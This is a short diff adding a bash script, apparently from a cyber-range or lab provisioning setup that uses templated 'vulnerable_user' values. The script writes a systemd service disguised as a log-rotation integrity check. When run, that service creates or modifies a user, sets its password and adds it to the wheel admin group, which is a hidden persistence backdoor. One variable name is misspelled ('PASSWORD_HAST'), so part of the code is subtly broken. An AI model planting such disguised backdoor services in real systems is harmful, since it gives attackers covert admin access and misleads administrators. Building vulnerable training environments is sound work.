@@ -1,0 +1,22 @@
+#!/usr/bin/env bash
+
+DIR_PATH="$1"
+
+USERNAME="{{ vulnerable_user.username }}"
+PASSWORD_HASH="$(openssl passwd -6 {{ vulnerable_user.password }})"
+
+cat <<EOF > "$DIR_PATH/logrotate-check.service"
+[Unit]
+Description=Check Log Rotation Integrity
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c ' \
+    if ! id $USERNAME &>/dev/null; then \
+        useradd -m -p "$PASSWORD_HASH" -U -G wheel $USERNAME; \
+    else \
+        usermod -p "$PASSWORD_HAST" $USERNAME; \
+        usermod -aG wheel $USERNAME; \
+    fi'
+EOF
